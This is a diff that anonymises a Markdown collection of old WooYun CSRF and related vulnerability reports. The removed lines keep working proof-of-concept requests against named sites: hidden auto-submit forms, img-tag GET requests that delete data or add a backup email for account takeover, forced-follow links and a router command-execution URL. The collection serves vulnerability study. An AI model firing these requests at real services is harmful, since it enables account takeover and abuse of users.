-**详情**: 有个清空草稿看到没，没有tokenhttp://www.zhihu.com/draft/clear怎么利用，你懂的
+**详情**: 有个清空草稿看到没，没有tokenhttps://example.com/[已脱敏]
 
 **POC**: 我的草稿呢
 
@@ -6307,7 +6307,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 结合上次漏洞的各种crsf，我们可以达到很多目的这里以点赞为例点赞地址为：http://www.codoon.com/feed/get_praise_feed?feed_id=赞ID&value=1头像处设置为上面的点赞地址，只要有展示图像的地方，就相当于构成了一次CRSF，我们可以去访问别人的主页（留下我们的访客记录），可以在发动态（这里也会展示我的图像）……很多地方都会img加载图像，但我的图像地址已经被改成crsf地址了，所以问题来了
+**详情**: 结合上次漏洞的各种crsf，我们可以达到很多目的这里以点赞为例点赞地址为：https://example.com/[已脱敏]
 
 **POC**: 某一时间段的点赞记录上图就可以证明可以大面积让别人帮我们点赞现在刚好有个活动，为自己集100赞，可以兑换咕咚手环2一个，不知道能否兑换一个，哈哈哈！
 
@@ -6317,7 +6317,7 @@
 ---
 
 ---
-### [wooyun-2014-054785] 人人网-百度OAuth 2.0 redirect_uir CSRF 漏洞
+### [wooyun-2014-054785] 人人网-某搜索引擎OAuth 2.0 redirect_uir CSRF 漏洞
 **厂商**: 人人网 | **年份**: 2014 | **类型**: CSRF
 
 **元思考**: 触发信号: 参数注入, 认证接口
@@ -6329,7 +6329,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 人人-百度 OAuth 2.0 认证流程中https://openapi.baidu.com/oauth/2.0/authorize?response_type=code&client_id=foRRWjPq8In3SIhmKQw1Pep3&redirect_uri=http://www.renren.com/bind/baidu/baiduLoginCallBack人人网并没有加入state 参数 来抵抗针对redirect_uir 的CSRF 攻击。如果攻击者重新发起一个人人-百度OAuth 2.0 认证请求，并截获OAuth 2.0 认证请求的返回。http://www.renren.com/bind/baidu/baiduLoginCallBack?code=f056147c661d0b9fbb6cd305567cb994攻击者诱骗已经登录的人人网用户点击(比如通过邮件或者QQ等方
+**详情**: 人人-某搜索引擎 OAuth 2.0 认证流程中https://example.com/[已脱敏] 参数 来抵抗针对redirect_uir 的CSRF 攻击。如果攻击者重新发起一个人人-某搜索引擎OAuth 2.0 认证请求，并截获OAuth 2.0 认证请求的返回。https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -6353,7 +6353,7 @@
 
 **详情**: 
 
-**POC**: 站长登录后可以点击一下：http://user.sanwen8.cn/do/logout/id=53154骚年来一发把
+**POC**: 站长登录后可以点击一下：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -6361,7 +6361,7 @@
 ---
 
 ---
-### [wooyun-2014-054894] 太平洋亲子网-QQ OAuth 2.0 redirect_uir CSRF 漏洞
+### [wooyun-2014-054894] 太平洋亲子网-某互联网公司 OAuth 2.0 redirect_uir CSRF 漏洞
 **厂商**: 太平洋亲子网 | **年份**: 2014 | **类型**: CSRF
 
 **元思考**: 触发信号: 认证接口
@@ -6373,7 +6373,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 太平洋亲子网-QQ OAuth 2.0 认证流程中https://graph.qq.com/oauth2.0/authorize?response_type=code&scope=get_user_info,get_simple_userinfo,add_topic,upload_pic,add_share&redirect_uri=http%3A%2F%2Fpassport2.pcbaby.com.cn%2Fpassport2%2Fapi%2Fopen_oauth.jsp&state=loginBind%3Dhttp%3A%2F%2Fmy.pcbaby.com.cn%2Fpassport%2Fopens%2Fbind_done.jsp%26type%3Dqzone_baby%26return%3Dhttp%3A%2F%2Fmy.pcbaby.com.cn%2Fuser%2Fsetting
+**详情**: 太平洋亲子网-某互联网公司 OAuth 2.0 认证流程中https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -6383,7 +6383,7 @@
 ---
 
 ---
-### [wooyun-2013-025888] 无觅网CSRF，可发新浪，腾讯，搜狐，网易微博
+### [wooyun-2013-025888] 无觅网CSRF，可发某社交平台，某互联网公司，搜狐，某互联网公司某社交平台
 **厂商**: 无觅网 | **年份**: 2013 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
@@ -6395,9 +6395,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 评论处未做token验证或者referer验证，可直接CSRF，也可以使用户强制选择同步到微博。
+**详情**: 评论处未做token验证或者referer验证，可直接CSRF，也可以使用户强制选择同步到某社交平台。
 
-**POC**: function publish(){url='http://www.wumii.com/setting/sync/comment';data='sync=true';post(url,data,true);url = 'http://www.wumii.com/comment/add';data = 'id=MAC5TbSP&c=1234555';post(url,data,true);}其中第一个请求是让用户选择"同步到微博"，第二个请求中id参数是表明哪一篇文章，第二个参数是评论内容，无任何验证
+**POC**: function publish(){url='https://example.com/[已脱敏]';data='sync=true';post(url,data,true);url = 'https://example.com/[已脱敏]';data = 'id=MAC5TbSP&c=1234555';post(url,data,true);}其中第一个请求是让用户选择"同步到某社交平台"，第二个请求中id参数是表明哪一篇文章，第二个参数是评论内容，无任何验证
 
 **绕过**: 直接利用
 
@@ -6417,7 +6417,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 在测试网站时发现删除收获地址时,只采用ID进行认证，也就是说只要知道对方的地址ID，便可构造poc进行CSRF，于是注册了两个号来测试：帐号1：帐号2：构造url:http://www.ailvxing.com//e/ShopSys/doaction.php?enews=DelAddress&addressid=1592让账号1来访问：可以看到已经成功删除。可构造POC:<html><img src="http://www.ailvxing.com//e/ShopSys/doaction.php?enews=DelAddress&addressid=1592"></html>
+**详情**: 在测试网站时发现删除收获地址时,只采用ID进行认证，也就是说只要知道对方的地址ID，便可构造poc进行CSRF，于是注册了两个号来测试：帐号1：帐号2：构造url:https://example.com/[已脱敏] src="https://example.com/[已脱敏]"></html>
 
 **POC**: (见原文)
 
@@ -6439,9 +6439,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.id68.cn全部都存在CSRFPOC个人资料<html><body><form action="http://www.id68.cn/member/memberinfo/editmemberinfo/" method="POST"><input type="hidden" name="cell&#95;phone" value="13333333331" /><input type="hidden" name="info" value="222" /><input type="hidden" name="age" value="0" /><input type="hidden" name="province" value="0" /><input type="hidden" name="area" value="�#175;&#183;�#128;&#137;�#1
+**详情**: https://example.com/[已脱敏] action="https://example.com/[已脱敏]" method="POST"><input type="hidden" name="cell&#95;phone" value="13333333331" /><input type="hidden" name="info" value="222" /><input type="hidden" name="age" value="0" /><input type="hidden" name="province" value="0" /><input type="hidden" name="area" value="�#175;&#183;�#128;&#137;�#1
 
-**POC**: 单位资料<html><body><form action="http://www.id68.cn/member/memberinfo/editdepartment/" method="POST"><input type="hidden" name="department&#95;name" value="1111111111111111111" /><input type="hidden" name="department&#95;address" value="1111111111111111111" /><input type="hidden" name="&#95;tps" value=
+**POC**: 单位资料<html><body><form action="https://example.com/[已脱敏]" method="POST"><input type="hidden" name="department&#95;name" value="1111111111111111111" /><input type="hidden" name="department&#95;address" value="1111111111111111111" /><input type="hidden" name="&#95;tps" value=
 
 **绕过**: 直接利用
 
@@ -6449,8 +6449,8 @@
 ---
 
 ---
-### [wooyun-2014-075461] 新浪微博某分站csrf发私信并可以无限发送私信
-**厂商**: 新浪 | **年份**: 2014 | **类型**: CSRF
+### [wooyun-2014-075461] 某社交平台某社交平台某分站csrf发私信并可以无限发送私信
+**厂商**: 某社交平台 | **年份**: 2014 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
 
@@ -6461,9 +6461,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://renmai.weibo.com/ 微博人脉处抓包 木有token啊
+**详情**: https://example.com/[已脱敏] 某社交平台人脉处抓包 木有token啊
 
-**POC**: 经过测试发现 验证了Referer头Referer 为*。weibo.com而且还可以get  发送  于是构造urlhttp://renmai.weibo.com/msg/new-msg?obj_uid=3975359730&text=testcsrf&trace_type=ajax发一条微博点击之后而且还可以自己发给自己 。。。可以发给任意微博用户2：私信炸弹发私信抓包 直接到intruder  1000条很快跑完！！1000多条。。
+**POC**: 经过测试发现 验证了Referer头Referer 为*。weibo.com而且还可以get  发送  于是构造urlhttps://example.com/[已脱敏] 。。。可以发给任意某社交平台用户2：私信炸弹发私信抓包 直接到intruder  1000条很快跑完！！1000多条。。
 
 **绕过**: 直接利用
 
@@ -6505,7 +6505,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 名品导购网多处存在csrf漏洞，这边以修改收货地址为例。修改收货地址，抓包：修改成功:无不可预测参数，构造链接xmlhttp.open("POST", "http://passport.mplife.com/settings/perAddress.aspx", true);xmlhttp.withCredentials = true;xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");xmlhttp.send("__VIEWSTATE=&ctl00%24ctl00%24ContentBody%24ContentRight%24hcity=110000&ctl00%24ctl00%24ContentBody%24ContentRight%24harea=110101&ctl00%24ctl0
+**详情**: 名品导购网多处存在csrf漏洞，这边以修改收货地址为例。修改收货地址，抓包：修改成功:无不可预测参数，构造链接xmlhttp.open("POST", "https://example.com/[已脱敏]", true);xmlhttp.withCredentials = true;xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");xmlhttp.send("__VIEWSTATE=&ctl00%24ctl00%24ContentBody%24ContentRight%24hcity=110000&ctl00%24ctl00%24ContentBody%24ContentRight%24harea=110101&ctl00%24ctl0
 
 **POC**: 多处存在类似漏洞，望厂商逐一修改求礼物。。
 
@@ -6549,18 +6549,18 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1. 删除旅程处可以csrf，GET方式poc：<img src=http://breadtrip.com/trips/旅程的ID，可以在URL处查找/delete/>自己发布一个旅程测试：访问poc页面：刷新主页，旅程被删除了。2. 收藏的功能存在CSRF。poc:http://breadtrip.com/trips/2387707905/bookmark/这个可能被用来恶意传播某些信息。具体就不截图了。3. 退出的功能存在CSRFpoc：http://breadtrip.com/accounts/logout/
+**详情**: 1. 删除旅程处可以csrf，GET方式poc：<img src=https://example.com/[已脱敏] 收藏的功能存在CSRF。poc:https://example.com/[已脱敏] 退出的功能存在CSRFpoc：https://example.com/[已脱敏]
 
 **POC**: 自己发布一个旅程测试：访问poc页面：刷新主页，旅程被删除了。
 
 **绕过**: 直接利用
 
-**修复**: 参考wooyun知识库：http://drops.wooyun.org/papers/155
+**修复**: 参考wooyun知识库：https://example.com/[已脱敏]
 ---
 
 ---
-### [wooyun-2012-09949] 新浪微博加关注CSRF漏洞（已经泛滥）
-**厂商**: 新浪 | **年份**: 2012 | **类型**: CSRF
+### [wooyun-2012-09949] 某社交平台某社交平台加关注CSRF漏洞（已经泛滥）
+**厂商**: 某社交平台 | **年份**: 2012 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
 
@@ -6571,18 +6571,18 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 在微博上有人发灵异视频链接让人点击，原始短URL：http://t.cn/zWirM7P，进入后如图再次点击查看后被强行关注13个微博，抓包查看。小号被加粉丝随便打开一个被强加的微博粉丝都超级多啊，怀疑都是此类方式刷上来的
+**详情**: 在某社交平台上有人发灵异视频链接让人点击，原始短URL：https://example.com/[已脱敏]
 
-**POC**: 漏洞接口：https://api.weibo.com/2/friendships/create.jsonPOST方式uid=[强行加关注的目标微博uid]&source=3818214747&_cache_time=0&method=post
+**POC**: 漏洞接口：https://example.com/[已脱敏]]&source=3818214747&_cache_time=0&method=post
 
 **绕过**: 直接利用
 
-**修复**: 新浪懂得。
+**修复**: 某社交平台懂得。
 ---
 
 ---
-### [wooyun-2014-087241] 美团网CSRF可以删除其他用户站内消息
-**厂商**: 美团网 | **年份**: 2014 | **类型**: CSRF
+### [wooyun-2014-087241] 某外卖平台网CSRF可以删除其他用户站内消息
+**厂商**: 某外卖平台网 | **年份**: 2014 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
 
@@ -6604,7 +6604,7 @@
 
 ---
 ### [wooyun-2015-0113536] Newifi y1路由器后台登录绕过后可执行任意系统命令与CSRF风险等
-**厂商**: 百度 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误
+**厂商**: 某搜索引擎 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 认证接口
 
@@ -6615,9 +6615,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://link.baidu.com/myrouter/wifiLogin?target=self&getNasBduss=1&toUrl=http://192.168.99.1/cgi-bin/luci/unauth/verify?bdact=login&device_id=null输入百度账号密码登录，抓包打开192.168.99.1开头的url可以进入下面的网址然而这并没有什么卵用保存上面的stok值http://192.168.99.1/cgi-bin/luci/;stok=15ee99093643c56457993fdd8dae9773/admin/wifi_n_setting
+**详情**: https://example.com/[已脱敏]
 
-**POC**: 命令执行：http://192.168.99.1/cgi-bin/luci/;stok=abe40daae37207f5380dded673f0d910/admin/newwifi/comcmd?cmd=id
+**POC**: 命令执行：http://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -6625,8 +6625,8 @@
 ---
 
 ---
-### [wooyun-2013-018470] 新浪自动加粉丝漏洞
-**厂商**: 新浪 | **年份**: 2013 | **类型**: CSRF
+### [wooyun-2013-018470] 某社交平台自动加粉丝漏洞
+**厂商**: 某社交平台 | **年份**: 2013 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
 
@@ -6637,9 +6637,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 案例:http://weibo.cn/2013/happyGetData?att=1&uid=2074219121&mid=3541949564378375&rl=0&vt=1修改uid为自己的，别人打开链接就中招，关注这个id。
+**详情**: 案例:https://example.com/[已脱敏]
 
-**POC**: 案例:http://weibo.cn/2013/happyGetData?att=1&uid=2074219121&mid=3541949564378375&rl=0&vt=1修改uid为自己的，别人打开链接就中招，关注这个id。
+**POC**: 案例:https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -6659,9 +6659,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 让我们看看保存参数recvProvince=åäº¬&recvCity=åäº¬&recvArea=æµ·æ·åº&recvAddr=test&recvName=test&recvPostalCode=123456&recvMobile=13800138000收货人姓名省recvCity市recvArea 区recvAddrrecvName 收货人姓名recvPostalCode 邮编recvMobile 手机号码这个也可以构造一个poc删除抓包得到：http://hui.renren.com/onlineshopping/address/deleteUserAddressConfigid=2507post数据我们mark一下OK。返回数据：{"result":true,"retCode":0}翻译后就是：{“结果”：真实的，“RETCODE”：0}非常的beautiful ，
+**详情**: 让我们看看保存参数recvProvince=åäº¬&recvCity=åäº¬&recvArea=æµ·æ·åº&recvAddr=test&recvName=test&recvPostalCode=123456&recvMobile=13800138000收货人姓名省recvCity市recvArea 区recvAddrrecvName 收货人姓名recvPostalCode 邮编recvMobile 手机号码这个也可以构造一个poc删除抓包得到：https://example.com/[已脱敏]"result":true,"retCode":0}翻译后就是：{“结果”：真实的，“RETCODE”：0}非常的beautiful ，
 
-**POC**: 让我们看看保存参数recvProvince=åäº¬&recvCity=åäº¬&recvArea=æµ·æ·åº&recvAddr=test&recvName=test&recvPostalCode=123456&recvMobile=13800138000收货人姓名省recvCity市recvArea 区recvAddrrecvName 收货人姓名recvPostalCode 邮编recvMobile 手机号码这个也可以构造一个poc删除抓包得到：http://hui.renren.com/onlineshopping/address/deleteUserAddressConf
+**POC**: 让我们看看保存参数recvProvince=åäº¬&recvCity=åäº¬&recvArea=æµ·æ·åº&recvAddr=test&recvName=test&recvPostalCode=123456&recvMobile=13800138000收货人姓名省recvCity市recvArea 区recvAddrrecvName 收货人姓名recvPostalCode 邮编recvMobile 手机号码这个也可以构造一个poc删除抓包得到：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -6669,8 +6669,8 @@
 ---
 
 ---
-### [wooyun-2012-08065] 腾讯公益某活动可以修改别人任意个性签名
-**厂商**: 腾讯 | **年份**: 2012 | **类型**: CSRF
+### [wooyun-2012-08065] 某互联网公司公益某活动可以修改别人任意个性签名
+**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
 
@@ -6681,9 +6681,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://npoapp.gongyi.qq.com/yuejuan5/qq_gxqm?qm_num=3&content=%e5%b8%ae%e6%82%a8%e8%a7%a3%e5%86%b3%e4%b8%80%e5%88%87%e7%bd%91%e7%bb%9c%e9%97%ae%e9%a2%98%ef%bc%8c%e8%81%94%e7%b3%bb_%e7%ba%a2%e9%85%92%e7%8b%ac%e9%86%89+Qq_429590191+-+www.xjquc.com&isajax=1&_=1339136194456修改content后面的字符串
+**详情**: https://example.com/[已脱敏]
 
-**POC**: 在QQ空间发布效果最好，直接打开就成功了。
+**POC**: 在某互联网公司空间发布效果最好，直接打开就成功了。
 
 **绕过**: 直接利用
 
@@ -6725,7 +6725,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 点击关注，抓包，为get类型，变量为被关注的id。测试地址，官方测试网站：http://www.multibuy.cn/index.php?act=member_snsfriend&op=find
+**详情**: 点击关注，抓包，为get类型，变量为被关注的id。测试地址，官方测试网站：https://example.com/[已脱敏]
 
 **POC**: 。
 
@@ -6769,18 +6769,18 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 修改个人信息处未加token验证 未验证refer<html><body><form action="http://www.spider.com.cn/newuserjquery.action" method="POST"><input type="hidden" name="usertype" value="first002" /><input type="hidden" name="useralise" value="wooyuntest" /><input type="hidden" name="sex" value="m" /><input type="hidden" name="year&#95;sld" value="2015" /><input type="hidden" name="month&#95;sld" value="01" /><input type="hidde
+**详情**: 修改个人信息处未加token验证 未验证refer<html><body><form action="https://example.com/[已脱敏]" method="POST"><input type="hidden" name="usertype" value="first002" /><input type="hidden" name="useralise" value="wooyuntest" /><input type="hidden" name="sex" value="m" /><input type="hidden" name="year&#95;sld" value="2015" /><input type="hidden" name="month&#95;sld" value="01" /><input type="hidde
 
-**POC**: poc地址：http://xss.gift/spidercsrf.html
+**POC**: poc地址：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
-**修复**: poc地址：http://xss.gift/spidercsrf.html
+**修复**: poc地址：https://example.com/[已脱敏]
 ---
 
 ---
-### [wooyun-2013-017271] 我是如何刷新浪微博粉丝的
-**厂商**: 新浪微博 | **年份**: 2013 | **类型**: CSRF
+### [wooyun-2013-017271] 我是如何刷某社交平台某社交平台粉丝的
+**厂商**: 某社交平台某社交平台 | **年份**: 2013 | **类型**: CSRF
 
 **元思考**: 触发信号: 参数注入, 上传功能
 
@@ -6791,9 +6791,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1.首先声明下哈：我只是简单测试给自己刷了一些粉丝，没有继续了；确实可以搞CSRF蠕虫的，我木搞啊！我是好娃子！2.开始吧，出问题的站点是：tw.weibo.com这个站点对CSRF不设防，加关注、取消关注、发微博、留言不设置任何防范。我下面举两个例子：3.加关注的接口是：http://tw.weibo.com/api/addfriendship/?uid=一个GET请求，uid参数是所要关注的对象uid，乌云的uid为：1981622273，那么微博用户以任何方式访问了下面的链接即可关注乌云微博：http://tw.weibo.com/api/addfriendship/?uid=19816222734.利用方式一：配合社会工程诱使微博用户点击上述链接，当然得有一个平台让微博用户去点击，你可以通过QQ等聊天软件发送上述链接诱使用户点击，但是不觉得小题大做了么，而且很费事！其实微博本身就是
+**详情**: 1.首先声明下哈：我只是简单测试给自己刷了一些粉丝，没有继续了；确实可以搞CSRF蠕虫的，我木搞啊！我是好娃子！2.开始吧，出问题的站点是：tw.weibo.com这个站点对CSRF不设防，加关注、取消关注、发某社交平台、留言不设置任何防范。我下面举两个例子：3.加关注的接口是：https://example.com/[已脱敏]
 
-**POC**: 6.好的，刷粉丝的问题说完了！下面是可能引发蠕虫的地方，发微博（我没有测试哈哈），我看了留言的地方，没有防范CSRF，恐怖的是居然也是个GET请求方式！请看下面请求：http://tw.weibo.com/api/addcomment/?mid=3534023949539660&comment=so+nice&_=1358063650295通过上面的两种利用方式，一经访问，立即生效！当然，如果你勾选了【同时转发到微博】，那么weibo.com的首页也会遭受蠕虫的重创了！7.我分享的这个各大互联网厂商防范CSRF通病，上面其实已经说的很清楚了，不知道各位看官是否注意到。就是利用微博这个平台，对于
+**POC**: 6.好的，刷粉丝的问题说完了！下面是可能引发蠕虫的地方，发某社交平台（我没有测试哈哈），我看了留言的地方，没有防范CSRF，恐怖的是居然也是个GET请求方式！请看下面请求：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -6813,7 +6813,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 添加备用邮箱处无token表单使用的是POST，但是尝试了一下，GET也能成功啊！！！！！！危害瞬间提高了一个等级啊！！！！！！所以，POC如下：<img src=http://pass.tom.com/safeBind.php?action=add1&email2=youremailhere@wooyun.org />欺骗用户访问含有这段代码的页面后，就会自动增加一个备用邮箱，就可以找回密码了。下面是图，就不解释了。
+**详情**: 添加备用邮箱处无token表单使用的是POST，但是尝试了一下，GET也能成功啊！！！！！！危害瞬间提高了一个等级啊！！！！！！所以，POC如下：<img src=https://example.com/[已脱敏] />欺骗用户访问含有这段代码的页面后，就会自动增加一个备用邮箱，就可以找回密码了。下面是图，就不解释了。
 
 **POC**: (见原文)
 
@@ -6823,7 +6823,7 @@
 ---
 
 ---
-### [wooyun-2014-054897] 太平洋家居网-新浪 OAuth 2.0 redirect_uir CSRF 漏洞
+### [wooyun-2014-054897] 太平洋家居网-某社交平台 OAuth 2.0 redirect_uir CSRF 漏洞
 **厂商**: 太平洋家居网 | **年份**: 2014 | **类型**: CSRF
 
 **元思考**: 触发信号: 认证接口
@@ -6835,7 +6835,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 太平洋家居网-新浪 OAuth 2.0 认证流程中https://api.weibo.com/2/oauth2/authorize?response_type=code&redirect_uri=http%3A%2F%2Fpassport2.pchouse.com.cn%2Fpassport2%2Fapi%2Fopen_oauth.jsp&state=loginBind%3Dhttp%3A%2F%2Fmy.pchouse.com.cn%2Fpassport%2Fopens%2Fbind_done.jsp%26type%3Dsina_house%26return%3Dhttp%3A%2F%2Fmy.pchouse.com.cn%2Fsetting%2Fshare.jsp&client_id=1207940458太平洋家居网并没有提供有效方式抵抗针对redirect_uir 的CSRF 攻击。
+**详情**: 太平洋家居网-某社交平台 OAuth 2.0 认证流程中https://example.com/[已脱敏] 的CSRF 攻击。
 
 **POC**: (见原文)
 
@@ -6857,7 +6857,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 药房网某处存在CSRF可添加收获地址添加收获地址post包中未加token 也未进行referer check 导致csrfcsrf poc<html><body><form action="http://m.yaofang.cn/user/addAddress" method="POST"><input type="hidden" name="consignee" value="xijinping" /><input type="hidden" name="mobile" value="13888888888" /><input type="hidden" name="address" value="xijinping" /><input type="hidden" name="province" value="40002" /><input type="hidden" name="ci
+**详情**: 药房网某处存在CSRF可添加收获地址添加收获地址post包中未加token 也未进行referer check 导致csrfcsrf poc<html><body><form action="https://example.com/[已脱敏]" method="POST"><input type="hidden" name="consignee" value="xijinping" /><input type="hidden" name="mobile" value="13888888888" /><input type="hidden" name="address" value="xijinping" /><input type="hidden" name="province" value="40002" /><input type="hidden" name="ci
 
 **POC**: WooYun: 药房网某处存在csrf可修改用户信息上一个漏洞说 给礼物 几个月过去了 屁都没有  忽悠我呢？
 
@@ -6901,18 +6901,18 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: csdn的绑定微博登陆的请求为https://passport.csdn.net/auth/sinat此请求并未做csrf防护，攻击者可以在第三方网页中伪造此请求新浪微博的授权有如下特点，如果当前登陆的微博曾经授权过csdn，那么就会自动绑定成功所以我们可以找一个新浪微博登陆的csrf漏洞，让用户自动登陆攻击者的微博（新浪有此类漏洞，这里就不详细写出）然后再让用户访问绑定请求，这样就完成了对攻击者微博的绑定。攻击者使用微博登陆就可以进入用户的csdn账号
+**详情**: csdn的绑定某社交平台登陆的请求为https://example.com/[已脱敏]
 
-**POC**: 已录视频http://v.youku.com/v_show/id_XMTQxNzEzNjgxNg==.html密码：198625
+**POC**: 已录视频https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
-**修复**: 增加csrf防护微博绑定强制使用微博用户名密码登陆
+**修复**: 增加csrf防护某社交平台绑定强制使用某社交平台用户名密码登陆
 ---
 
 ---
-### [wooyun-2010-0780] 腾讯QQ空间CSRF漏洞
-**厂商**: 腾讯 | **年份**: 2010 | **类型**: CSRF
+### [wooyun-2010-0780] 某互联网公司某互联网公司空间CSRF漏洞
+**厂商**: 某互联网公司 | **年份**: 2010 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
 
@@ -6925,7 +6925,7 @@
 
 **详情**: 测试前：诱使用户访问页面后(允许访问人增加，密码修改)：
 
-**POC**: CSRF FORM示例代码：<form action="http://w.qzone.qq.com/cgi-bin/right/set_entryright.cgi" method="post"><input type="hidden" name="seq" value="335" /><input type="hidden" name="uinlist" value="***" /><!--允许查看用户的列表--><input type="hidden" name="entryq1" value="you know?" /><!--问题1--><input type="hidden" nam
+**POC**: CSRF FORM示例代码：<form action="https://example.com/[已脱敏]" method="post"><input type="hidden" name="seq" value="335" /><input type="hidden" name="uinlist" value="***" /><!--允许查看用户的列表--><input type="hidden" name="entryq1" value="you know?" /><!--问题1--><input type="hidden" nam
 
 **绕过**: 直接利用
 
@@ -6945,7 +6945,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://v.6.cn/crossdomain.xml<cross-domain-policy><allow-access-from domain="*"/></cross-domain-policy>6房间flash配置文件为*，导致其他域可发送任意请求eg获取聊天记录：http://v.6.cn/user/im/list.php  //劫持获取这个页面得到tuid=53646313（聊天ID，如果有多个则获取多个）http://v.6.cn/user/im/imMsgLogs.php?tuid=53646313  //继续劫持获取与用户的聊天记录POC：http://jeary.org/flashCSRF/ContentHijacking.html?objfile=http://jeary.org/flashCSRF/objects/ContentHijacking.swf&obj
+**详情**: https://example.com/[已脱敏] domain="*"/></cross-domain-policy>6房间flash配置文件为*，导致其他域可发送任意请求eg获取聊天记录：https://example.com/[已脱敏]  //劫持获取这个页面得到tuid=53646313（聊天ID，如果有多个则获取多个）https://example.com/[已脱敏]  //继续劫持获取与用户的聊天记录POC：https://example.com/[已脱敏]
 
 **POC**: 如上。
 
@@ -6989,9 +6989,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://my.letv.com/crossdomain.xml敏感用户域配置星号导致任意跨域获取.劫持查看他人消息以及乐点消费记录等：观影记录：当然也是可以模拟其他请求，如修改资料。
+**详情**: https://example.com/[已脱敏]
 
-**POC**: 此类问题可查看文章进行详细测试步骤：http://jeary.org/?post=54
+**POC**: 此类问题可查看文章进行详细测试步骤：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -6999,7 +6999,7 @@
 ---
 
 ---
-### [wooyun-2014-055462] 音悦台-百度 OAuth 2.0 redirect_uri CSRF 漏洞
+### [wooyun-2014-055462] 音悦台-某搜索引擎 OAuth 2.0 redirect_uri CSRF 漏洞
 **厂商**: 音悦台 | **年份**: 2014 | **类型**: CSRF
 
 **元思考**: 触发信号: 认证接口
@@ -7011,7 +7011,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 音悦台-百度 OAuth 2.0 认证流程中https://graph.renren.com/oauth/authorize?client_id=117231&response_type=code&scope=publish_feed,photo_upload&state=a%3d1%26b%3d2&redirect_uri=http%3A%2F%2Fwww.5sing.com%2FOpenLoginRecive%3Ftype%3D3%26refUrl%3Dhttp%3A%2F%2Fwww.5sing.com%2Fmy%2Fset%2Fbindsns%2F3%3Fcommand%3Dbind&x_renew=true音悦台并没有提供有效方式抵抗针对redirect_uri 的CSRF 攻击。如果攻击者重新发起一个音悦台-百度  OAuth 2.0 认证请求，并截获OAuth 2.0 认证请
+**详情**: 音悦台-某搜索引擎 OAuth 2.0 认证流程中https://example.com/[已脱敏] 的CSRF 攻击。如果攻击者重新发起一个音悦台-某搜索引擎  OAuth 2.0 认证请求，并截获OAuth 2.0 认证请
 
 **POC**: (见原文)
 
@@ -7033,7 +7033,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 问题出在这里http://my.xcar.com.cn/set/address.php收货地址处，由于没有做好控制，导致可以添加任意收货地址。这是已经添加好的。接着我们构造表单，将收货人姓名修改一下。<form method="POST" name="form0" action="http://my.xcar.com.cn:80/set/address.php?action=add"><input type="hidden" name="type" value=""/><input type="hidden" name="id" value=""/><input type="hidden" name="uname" value="22222"/><input type="hidden" name="sheng_id" value="1"/><input type="hidden" name
+**详情**: 问题出在这里https://example.com/[已脱敏] method="POST" name="form0" action="https://example.com/[已脱敏]"><input type="hidden" name="type" value=""/><input type="hidden" name="id" value=""/><input type="hidden" name="uname" value="22222"/><input type="hidden" name="sheng_id" value="1"/><input type="hidden" name
 
 **POC**: (见原文)
 
@@ -7077,7 +7077,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 时光网微评功能设计缺陷导致跨站请求伪造(CSRF)#1poc：<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>get csrf</title></head><body><img src="http://service.mtime.com/Service/Twitter.msi?Ajax_CallBack=true&Ajax_CallBackType=Mtime.Service.Pages.TwitterService&Ajax_CallBackMethod=PostTweetCrossDomainByFlash&Ajax_CrossDomain=1&Ajax_RequestUrl=http%3A%2F%2Fmy.mtime.com%2F&t=20157241126
